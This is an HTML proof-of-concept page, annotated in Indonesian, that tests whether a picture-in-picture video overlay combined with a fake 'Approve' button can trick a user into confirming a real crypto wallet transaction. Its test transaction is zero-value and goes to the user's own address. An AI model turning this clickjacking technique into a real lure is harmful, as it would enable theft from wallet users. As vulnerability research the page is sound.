<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>pip test</title>
<style>
body{background:#000;color:#fff;font-family:system-ui;padding:12px;margin:0}
video{width:100%;background:#111}
button{display:block;width:100%;padding:14px;margin:8px 0;background:#fff;color:#000;border:0;border-radius:8px;font-size:16px}
button:active{opacity:.7}
#log{font-size:12px;color:#999;white-space:pre-wrap;margin-top:10px}
#fake{display:none;position:fixed;left:0;right:0;bottom:0;background:#000;padding:12px;padding-bottom:30px}
#fake button{background:#fff}
small{color:#888}
</style>
</head>
<body>

<p><b>TEST - pip clickjacking poc</b><br><small>bukan 1inch. buat test di wallet sendiri, testnet aja.</small></p>

<video id="v" playsinline controls muted loop src="https://0x403for.github.io/palsu.mp4"></video>

<button onclick="play()">play video</button>
<button onclick="pip()">masuk pip</button>
<button onclick="tx()">trigger tx 0 ke diri sendiri</button>
<button onclick="showfake()">munculin tombol palsu</button>

<div id="log">log:</div>

<div id="fake">
<button onclick="fakeclick()">Approve</button>
<small>ini tombol palsu dari halaman test. kalo diklik dan tx asli ikut ke approve, berarti bug.</small>
</div>

<script>
var acc = "";
var logEl = document.getElementById("log");
function l(t){ logEl.textContent += "\n" + t; }

function play(){
  var v = document.getElementById("v");
  v.play().then(function(){ l("video jalan"); }).catch(function(e){ l("gagal play: " + e.message); });
}

function pip(){
  var v = document.getElementById("v");
  try{
    if(v.webkitSetPresentationMode){
      v.webkitSetPresentationMode("picture-in-picture");
      l("masuk pip webkit");
    }else if(v.requestPictureInPicture){
      v.requestPictureInPicture();
      l("masuk pip");
    }else{
      l("pip ga support");
    }
  }catch(e){ l("pip error: " + e.message); }
}

function tx(){
  window.ethereum.request({method:"eth_requestAccounts"}).then(function(a){
    acc = a[0];
    l("connect: " + acc);
    return window.ethereum.request({
      method:"eth_sendTransaction",
      params:[{from:acc, to:acc, value:"0x0"}]
    });
  }).then(function(hash){
    l("tx: " + hash);
  }).catch(function(e){
    l("tx gagal: " + e.message);
  });
}

function showfake(){
  document.getElementById("fake").style.display = "block";
  l("tombol palsu muncul, geser pip ke bawah");
}

function fakeclick(){
  l("klik palsu kepencet");
  alert("ini tombol palsu. cek apa tx asli ikut ke approve?");
}
</script>
</body>
</html>
